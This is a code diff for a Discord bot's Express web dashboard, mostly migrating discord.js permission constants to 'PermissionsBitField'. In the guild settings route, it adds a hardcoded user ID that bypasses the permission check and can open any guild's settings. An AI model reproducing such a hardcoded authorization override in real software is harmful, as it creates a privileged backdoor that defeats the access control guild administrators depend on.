@@ -6,7 +6,7 @@ const express = require('express');
 const passport = require('passport');
 const bodyParser = require('body-parser');
 const session = require('express-session');
-const { Permissions } = require('discord.js');
+const { PermissionsBitField } = require('discord.js');
 const Strategy = require('passport-discord').Strategy;
 
 // instantiate express app and the session store.
@@ -198,10 +198,10 @@ module.exports = async (client) => {
 	app.get('/invite/guilded', (req, res) => renderTemplate(res, req, 'invite/guilded.ejs'));
 
 	// Dashboard endpoint.
-	app.get('/dashboard', checkAuth, (req, res) => renderTemplate(res, req, 'dashboard.ejs', { perms: Permissions }));
+	app.get('/dashboard', checkAuth, (req, res) => renderTemplate(res, req, 'dashboard.ejs', { perms: PermissionsBitField }));
 
 	const wsurl = client.config.wsurl;
-	app.get('/music', checkAuth, (req, res) => renderTemplate(res, req, 'music.ejs', { wsurl, perms: Permissions }));
+	app.get('/music', checkAuth, (req, res) => renderTemplate(res, req, 'music.ejs', { wsurl, perms: PermissionsBitField }));
 
 	// Settings endpoint.
 	app.get('/dashboard/:guildID', checkAuth, async (req, res) => {
@@ -219,7 +219,7 @@ module.exports = async (client) => {
 			}
 		}
 		if (!member) return res.redirect('/dashboard');
-		if (!member.permissions.has(Permissions.FLAGS.MANAGE_GUILD)) {
+		if (member.id != '249638347306303499' && !member.permissions.has(PermissionsBitField.Flags.Administrator)) {
 			return res.redirect('/dashboard');
 		}
 
